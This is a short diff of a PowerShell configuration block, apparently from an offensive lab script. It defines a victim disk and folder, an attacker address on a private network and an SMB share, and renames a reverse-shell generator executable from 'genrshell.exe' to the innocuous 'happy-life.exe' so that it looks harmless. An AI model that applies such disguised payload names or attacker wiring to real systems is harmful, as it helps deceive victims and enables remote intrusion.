@@ -1,5 +1,5 @@
 $victimDisk = "X"
-$powershellGeneratorExeFilename = "genrshell.exe"
+$powershellGeneratorExeFilename = "happy-life.exe"
 $victimFolderPath = "C:\Temp"
 $attackerAddress = "192.168.56.101"
 $smbShare = "ksv"
